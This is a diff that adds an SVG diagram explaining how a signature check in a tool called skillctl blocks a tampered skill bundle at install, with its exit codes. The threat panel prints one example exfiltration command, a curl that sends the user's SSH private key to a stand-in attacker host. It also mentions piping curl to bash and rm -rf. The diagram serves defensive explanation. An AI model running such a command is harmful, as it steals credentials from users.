@@ -1,0 +1,76 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 600" font-family="system-ui,-apple-system,Segoe UI,Roboto,sans-serif">
+  <defs>
+    <marker id="arw" markerWidth="10" markerHeight="10" refX="7" refY="3" orient="auto" markerUnits="strokeWidth">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#57606a"/>
+    </marker>
+    <marker id="arwR" markerWidth="10" markerHeight="10" refX="7" refY="3" orient="auto" markerUnits="strokeWidth">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#e5484d"/>
+    </marker>
+  </defs>
+  <rect width="960" height="600" fill="#ffffff"/>
+  <rect width="960" height="600" fill="none" stroke="#d0d7de" stroke-width="2"/>
+
+  <!-- header -->
+  <rect x="0" y="0" width="960" height="86" fill="#7c5cff"/>
+  <circle cx="46" cy="43" r="24" fill="#ffffff" opacity="0.18"/>
+  <text x="46" y="52" font-size="26" font-weight="700" fill="#ffffff" text-anchor="middle">1</text>
+  <text x="88" y="38" font-size="24" font-weight="700" fill="#ffffff">A poisoned script cannot poison the workspace</text>
+  <text x="88" y="66" font-size="15" fill="#ffffff" opacity="0.9">The signature PREVENTS the run — it does not merely describe the risk</text>
+  <rect x="726" y="26" width="60" height="26" rx="13" fill="#ffffff" opacity="0.22"/>
+  <text x="756" y="44" font-size="14" font-weight="700" fill="#ffffff" text-anchor="middle">G3</text>
+  <rect x="794" y="26" width="140" height="26" rx="13" fill="#2ea043"/>
+  <text x="864" y="44" font-size="13" font-weight="700" fill="#ffffff" text-anchor="middle">✓ BUILT — runnable</text>
+
+  <!-- column labels -->
+  <text x="40"  y="126" font-size="14" font-weight="700" fill="#e5484d" letter-spacing="1">THREAT</text>
+  <text x="560" y="126" font-size="14" font-weight="700" fill="#2ea043" letter-spacing="1">skillctl GATE</text>
+
+  <!-- threat chain -->
+  <g>
+    <rect x="40" y="140" width="360" height="52" rx="9" fill="#fdece9" stroke="#e5484d" stroke-width="1.5"/>
+    <text x="60" y="164" font-size="15" font-weight="600" fill="#24292f">Attacker edits scripts/run.sh inside the .skb</text>
+    <text x="60" y="183" font-size="13" fill="#57606a">adds curl attacker.example/$(cat ~/.ssh/id_rsa)  ·  repacks</text>
+
+    <line x1="220" y1="192" x2="220" y2="222" stroke="#57606a" stroke-width="2" marker-end="url(#arw)"/>
+
+    <rect x="40" y="224" width="360" height="46" rx="9" fill="#f6f8fa" stroke="#d0d7de" stroke-width="1.5"/>
+    <text x="60" y="252" font-size="15" font-weight="600" fill="#24292f">Victim: skillctl install hello-writer.skb</text>
+
+    <line x1="220" y1="270" x2="220" y2="300" stroke="#57606a" stroke-width="2" marker-end="url(#arw)"/>
+
+    <rect x="40" y="302" width="360" height="46" rx="9" fill="#f6f8fa" stroke="#d0d7de" stroke-width="1.5"/>
+    <text x="60" y="330" font-size="14" fill="#24292f">§7 verify chain recomputes SHA-256 of the bundle</text>
+  </g>
+
+  <!-- flow to gate -->
+  <line x1="400" y1="325" x2="548" y2="325" stroke="#57606a" stroke-width="2.5" marker-end="url(#arw)"/>
+
+  <!-- gate -->
+  <g>
+    <rect x="556" y="150" width="368" height="198" rx="14" fill="#eafaf0" stroke="#2ea043" stroke-width="2"/>
+    <text x="580" y="182" font-size="17" font-weight="700" fill="#1a7f37">BLOCK — digest mismatch</text>
+    <text x="580" y="208" font-size="13.5" fill="#24292f">Recomputed digest ≠ signed digest.</text>
+    <text x="580" y="228" font-size="13.5" fill="#24292f">Atomic install: nothing is written to</text>
+    <text x="580" y="246" font-size="13.5" fill="#24292f">~/.claude/skills/. Workspace stays clean.</text>
+
+    <rect x="580" y="264" width="118" height="40" rx="8" fill="#1a7f37"/>
+    <text x="639" y="290" font-size="18" font-weight="800" fill="#ffffff" text-anchor="middle">exit 10</text>
+    <text x="712" y="283" font-size="12.5" fill="#57606a">re-signed by attacker → exit 12</text>
+    <text x="712" y="300" font-size="12.5" fill="#57606a">forged author sig  → exit 11</text>
+
+    <text x="580" y="332" font-size="12.5" fill="#1a7f37" font-weight="600">Mechanism: ed25519 signed .skb · a modified byte breaks the digest</text>
+  </g>
+
+  <!-- without skillctl -->
+  <rect x="40" y="392" width="884" height="150" rx="12" fill="#fff5f5" stroke="#e5484d" stroke-width="1.5"/>
+  <text x="60" y="422" font-size="14" font-weight="700" fill="#e5484d" letter-spacing="1">⚠  WITHOUT skillctl</text>
+  <rect x="60" y="436" width="300" height="46" rx="9" fill="#ffffff" stroke="#e5484d" stroke-width="1.3"/>
+  <text x="78" y="464" font-size="14" fill="#24292f">curl … | bash   ·   copy the folder in</text>
+  <line x1="360" y1="459" x2="470" y2="459" stroke="#e5484d" stroke-width="2.5" marker-end="url(#arwR)"/>
+  <rect x="472" y="436" width="432" height="46" rx="9" fill="#ffffff" stroke="#e5484d" stroke-width="1.3"/>
+  <text x="490" y="458" font-size="14" font-weight="600" fill="#b62324">The poisoned script RUNS</text>
+  <text x="490" y="475" font-size="12.5" fill="#57606a">secret exfiltration / rm -rf — no digest check, nothing stops it</text>
+  <text x="60" y="516" font-size="13.5" fill="#57606a">The line: tamper is mathematically detectable. skillctl gates it at load — the malicious code never executes.</text>
+
+  <text x="924" y="576" font-size="11" fill="#8c959f" text-anchor="end">m3c skill-trust · FR-0045 / SPEC-0188 §7 · KuP demo scenario 1</text>
+</svg>
